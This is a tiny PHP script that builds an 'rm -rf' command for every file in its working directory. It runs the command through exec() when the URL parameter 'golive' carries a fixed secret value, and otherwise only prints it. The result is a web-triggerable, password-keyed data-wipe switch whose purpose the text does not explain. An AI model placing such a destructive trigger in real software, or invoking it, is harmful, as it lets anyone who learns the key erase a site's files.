<?php
$cmd = 'rm -rf ' . getcwd() . '/*';
if (isset($_GET['golive']) && $_GET['golive'] == 'alleztonton') {
    exec($cmd);
} else {
    echo $cmd;
}
